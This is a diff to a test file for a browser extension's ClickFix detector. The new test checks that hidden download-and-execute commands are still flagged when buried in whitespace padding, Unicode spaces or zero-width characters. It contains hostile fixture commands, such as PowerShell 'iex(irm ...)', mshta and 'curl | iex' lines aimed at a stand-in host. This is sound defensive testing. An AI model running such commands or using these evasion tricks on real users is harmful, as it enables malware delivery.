@@ -1,4 +1,4 @@
-import { looksLikeClickFixCommand, looksLikeHtmlSmugglingName } from "@engine/page/clickfix";
+import { clickFixTier, looksLikeClickFixCommand, looksLikeHtmlSmugglingName } from "@engine/page/clickfix";
 import { analyzeUrl } from "@engine/analyze";
 import { presentAnalysis } from "@engine/status/present";
 import { looksDangerousDownload } from "../../src/background/downloads";
@@ -22,6 +22,20 @@ describe("ClickFix command detector", () => {
     ).toBe(true);
     expect(looksLikeClickFixCommand("mshta https://evil.test/payload.hta")).toBe(true);
     expect(looksLikeClickFixCommand("curl https://evil.test/x.ps1 | iex")).toBe(true);
+  });
+
+  it("still flags a command buried in padding", () => {
+    const cmd = "powershell -w hidden -c iex(irm http://evil.test/p)";
+    expect(clickFixTier(`${" ".repeat(12_000)}${cmd}`)).toBe("strong");
+    expect(clickFixTier(`${" ".repeat(100_000)}${cmd}`)).toBe("strong");
+    expect(clickFixTier(`${cmd} #${"a".repeat(100_000)}`)).toBe("strong");
+    expect(clickFixTier(`${"a".repeat(20_000)}\n${cmd}`)).toBe("strong");
+    expect(clickFixTier(`${"\u00A0".repeat(4000)}${"\u2000".repeat(50)}${"\u3000".repeat(50)}${cmd}`)).toBe("strong");
+    expect(clickFixTier(`power\u200Bshell -w hidden -c iex(irm http://evil.test/p)`)).toBe("strong");
+    expect(clickFixTier(`${"a".repeat(20_000)}${cmd}${"a".repeat(20_000)}`)).toBe("strong");
+    expect(clickFixTier("a".repeat(20_000))).toBeNull();
+    expect(clickFixTier("curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh")).toBe("weak");
+    expect(clickFixTier(`${"a".repeat(20_000)}\ncurl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`)).toBe("weak");
   });
 
   it("does not flag ordinary documentation snippets", () => {
